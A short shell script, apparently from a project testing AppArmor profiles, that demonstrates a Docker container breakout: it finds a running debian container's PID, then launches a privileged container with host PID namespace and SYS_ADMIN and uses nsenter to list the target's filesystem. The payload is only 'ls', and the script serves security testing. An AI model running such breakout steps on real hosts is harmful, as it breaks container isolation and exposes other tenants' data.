#!/bin/sh

#Indicate the path of the shell script
attack="home/ubuntu/SecureWilly/Attacks/Nsenter/Breakout_to_Other_Container/ls_container"
#List all docker running containers and keep the line with debian image mentioned
docker ps | grep debian > dockerps
#Grub the container id
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
#Use docker inspect to detect the PID of the debian container's process
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
#Attack container - start the attacking container
docker run --security-opt "apparmor=attacker_profile" --pid=host --cap-add SYS_ADMIN --rm -it debian:latest nsenter --target ${container_pid} --mount ls
#Clear files
rm PID
rm dockerps
rm containerid
